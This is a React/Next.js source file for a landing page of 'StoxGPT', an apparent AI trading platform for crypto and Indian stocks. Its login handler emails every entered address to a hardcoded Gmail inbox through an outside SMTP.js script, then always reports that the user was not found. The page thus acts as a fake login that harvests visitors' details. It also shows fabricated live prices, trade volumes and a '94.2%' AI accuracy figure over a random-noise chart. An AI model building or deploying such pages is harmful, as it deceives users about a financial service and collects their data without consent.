"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card } from "@/components/ui/card"
import Link from "next/link"

// WARNING: Using SMTP.js client-side is INSECURE for production!
// This exposes email credentials in the browser. Use server-side email services in production.
declare global {
  interface Window {
    Email: {
      send: (config: {
        Host: string
        Username: string
        Password: string
        To: string
        From: string
        Subject: string
        Body: string
      }) => Promise<string>
    }
  }
}

export default function StoxGPTLanding() {
  const [showLogin, setShowLogin] = useState(false)
  const [showNotFound, setShowNotFound] = useState(false)
  const [email, setEmail] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [chartData, setChartData] = useState<number[]>([])

  useEffect(() => {
    const generateChartData = () => {
      const data = Array.from({ length: 20 }, (_, i) => {
        const base = 50 + Math.sin(i * 0.5) * 20
        const noise = Math.random() * 10 - 5
        return Math.max(10, Math.min(90, base + noise))
      })
      setChartData(data)
    }

    generateChartData()
    const interval = setInterval(generateChartData, 2000)
    return () => clearInterval(interval)
  }, [])

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    try {
      // Send email using SMTP.js (INSECURE - for demo only!)
      if (window.Email) {
        await window.Email.send({
          Host: "smtp.elasticemail.com",
          Username: "mayuraimakermail@gmail.com", // This should be environment variable in production
          Password: "your-smtp-password", // This should be environment variable in production
          To: "mayuraimakermail@gmail.com",
          From: "mayuraimakermail@gmail.com",
          Subject: "StoxGPT Login Attempt",
          Body: `Login attempt from: ${email}<br>Timestamp: ${new Date().toISOString()}`,
        })
      }
    } catch (error) {
      console.log("[v0] SMTP send failed:", error)
    }

    // Always show "user not found" after a brief delay
    setTimeout(() => {
      setIsLoading(false)
      setShowLogin(false)
      setShowNotFound(true)
    }, 1500)
  }

  return (
    <div className="min-h-screen bg-black relative overflow-hidden">
      <div className="absolute inset-0 overflow-hidden">
        {/* Animated neon lines */}
        <div className="absolute top-0 left-1/4 w-px h-full bg-gradient-to-b from-transparent via-cyan-400 to-transparent animate-pulse opacity-30" />
        <div
          className="absolute top-0 right-1/3 w-px h-full bg-gradient-to-b from-transparent via-purple-400 to-transparent animate-pulse opacity-20"
          style={{ animationDelay: "1s" }}
        />
        <div
          className="absolute left-0 top-1/3 w-full h-px bg-gradient-to-r from-transparent via-fuchsia-400 to-transparent animate-pulse opacity-25"
          style={{ animationDelay: "2s" }}
        />

        {/* Floating particles */}
        {[...Array(30)].map((_, i) => (
          <div
            key={i}
            className={`absolute w-1 h-1 rounded-full animate-particle ${
              i % 4 === 0
                ? "bg-cyan-400"
                : i % 4 === 1
                  ? "bg-fuchsia-400"
                  : i % 4 === 2
                    ? "bg-purple-400"
                    : "bg-green-400"
            }`}
            style={{
              left: `${Math.random() * 100}%`,
              animationDelay: `${Math.random() * 8}s`,
              animationDuration: `${8 + Math.random() * 4}s`,
            }}
          />
        ))}
      </div>

      {/* Gradient Background Overlay */}
      <div className="absolute inset-0 bg-gradient-to-br from-cyan-900/20 via-purple-900/20 to-fuchsia-900/20" />

      {/* Main Content */}
      <div className="relative z-10 min-h-screen flex items-center justify-center p-4">
        <div className="max-w-6xl mx-auto">
          <div className="grid lg:grid-cols-2 gap-12 items-center">
            {/* Left side - Hero content */}
            <div className="text-center lg:text-left">
              {/* Hero Title */}
              <h1 className="font-orbitron text-5xl md:text-7xl lg:text-8xl font-bold mb-6 neon-glow-cyan animate-float">
                StoxGPT
              </h1>

              {/* Tagline */}
              <p className="text-lg md:text-xl lg:text-2xl mb-8 neon-glow-magenta font-light">
                AI-powered Crypto & Indian Stock Market Trading Platform
              </p>

              {/* Description */}
              <div className="glassmorphic p-6 mb-8 animate-neon-border">
                <p className="text-base md:text-lg leading-relaxed text-gray-200 mb-4">
                  Experience the future of trading with{" "}
                  <span className="neon-glow-cyan font-semibold">AI-powered analysis</span>,{" "}
                  <span className="neon-glow-purple font-semibold">real-time trading</span>, and{" "}
                  <span className="neon-glow-magenta font-semibold">advanced market insights</span>.
                </p>
                <p className="text-sm md:text-base text-gray-300">
                  Harness cutting-edge artificial intelligence to navigate cryptocurrency and Indian stock markets with
                  unprecedented precision.
                </p>
              </div>

              <div className="flex flex-col sm:flex-row gap-4 justify-center lg:justify-start">
                <Link href="/login">
                  <Button
                    className="bg-transparent border-2 border-cyan-400 text-cyan-400 hover:bg-cyan-400 hover:text-black text-lg px-8 py-4 font-semibold transition-all duration-300 animate-glow w-full sm:w-auto"
                    size="lg"
                  >
                    Login to Terminal
                  </Button>
                </Link>
                <Link href="/login">
                  <Button
                    className="bg-transparent border-2 border-fuchsia-400 text-fuchsia-400 hover:bg-fuchsia-400 hover:text-black text-lg px-8 py-4 font-semibold transition-all duration-300 w-full sm:w-auto"
                    size="lg"
                  >
                    Sign Up Free
                  </Button>
                </Link>
              </div>
            </div>

            <div className="relative">
              <Card className="glassmorphic p-6 animate-neon-border">
                <div className="mb-4">
                  <h3 className="font-orbitron text-xl font-bold neon-glow-cyan mb-2">Live Market Data</h3>
                  <div className="flex gap-4 text-sm">
                    <span className="text-green-400">BTC: ₹42,85,000 (+2.4%)</span>
                    <span className="text-cyan-400">NIFTY: 24,850 (+0.8%)</span>
                  </div>
                </div>

                {/* Holographic Chart */}
                <div className="relative h-48 bg-black/30 rounded border border-cyan-400/30 overflow-hidden">
                  <div className="absolute inset-0 bg-gradient-to-t from-cyan-400/10 to-transparent" />
                  <svg className="w-full h-full" viewBox="0 0 400 200">
                    {/* Grid lines */}
                    {[...Array(5)].map((_, i) => (
                      <line
                        key={`h-${i}`}
                        x1="0"
                        y1={i * 40}
                        x2="400"
                        y2={i * 40}
                        stroke="rgba(0, 255, 255, 0.1)"
                        strokeWidth="1"
                      />
                    ))}
                    {[...Array(10)].map((_, i) => (
                      <line
                        key={`v-${i}`}
                        x1={i * 40}
                        y1="0"
                        x2={i * 40}
                        y2="200"
                        stroke="rgba(0, 255, 255, 0.1)"
                        strokeWidth="1"
                      />
                    ))}

                    {/* Animated chart line */}
                    <polyline
                      fill="none"
                      stroke="url(#chartGradient)"
                      strokeWidth="3"
                      points={chartData
                        .map((value, index) => `${(index / (chartData.length - 1)) * 400},${200 - (value / 100) * 200}`)
                        .join(" ")}
                      className="animate-pulse"
                    />

                    {/* Chart area fill */}
                    <polygon
                      fill="url(#chartFill)"
                      points={`0,200 ${chartData
                        .map((value, index) => `${(index / (chartData.length - 1)) * 400},${200 - (value / 100) * 200}`)
                        .join(" ")} 400,200`}
                    />

                    <defs>
                      <linearGradient id="chartGradient" x1="0%" y1="0%" x2="100%" y2="0%">
                        <stop offset="0%" stopColor="#00ffff" />
                        <stop offset="50%" stopColor="#ff00ff" />
                        <stop offset="100%" stopColor="#8000ff" />
                      </linearGradient>
                      <linearGradient id="chartFill" x1="0%" y1="0%" x2="0%" y2="100%">
                        <stop offset="0%" stopColor="rgba(0, 255, 255, 0.3)" />
                        <stop offset="100%" stopColor="rgba(0, 255, 255, 0.05)" />
                      </linearGradient>
                    </defs>
                  </svg>

                  {/* Holographic overlay effect */}
                  <div className="absolute inset-0 bg-gradient-to-r from-transparent via-cyan-400/10 to-transparent animate-pulse" />
                </div>

                {/* Trading stats */}
                <div className="grid grid-cols-3 gap-4 mt-4 text-center">
                  <div>
                    <div className="text-xs text-gray-400">24h Volume</div>
                    <div className="text-sm font-bold neon-glow-cyan">₹2.4B</div>
                  </div>
                  <div>
                    <div className="text-xs text-gray-400">Active Trades</div>
                    <div className="text-sm font-bold neon-glow-purple">1,247</div>
                  </div>
                  <div>
                    <div className="text-xs text-gray-400">AI Accuracy</div>
                    <div className="text-sm font-bold neon-glow-magenta">94.2%</div>
                  </div>
                </div>
              </Card>
            </div>
          </div>
        </div>
      </div>

      {/* User Not Found Modal - keeping for legacy support */}
      {showNotFound && (
        <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <Card className="glassmorphic p-8 w-full max-w-md border-red-500/50">
            <div className="space-y-6 text-center">
              <h2 className="font-orbitron text-2xl font-bold neon-glow-red">Access Denied</h2>

              <p className="text-lg neon-glow-red">User has not been found in database</p>

              <Button
                onClick={() => setShowNotFound(false)}
                className="bg-red-500 hover:bg-red-400 text-white font-semibold transition-all duration-300"
              >
                Close
              </Button>
            </div>
          </Card>
        </div>
      )}

      <script src="https://smtpjs.com/v3/smtp.js" async />
    </div>
  )
}
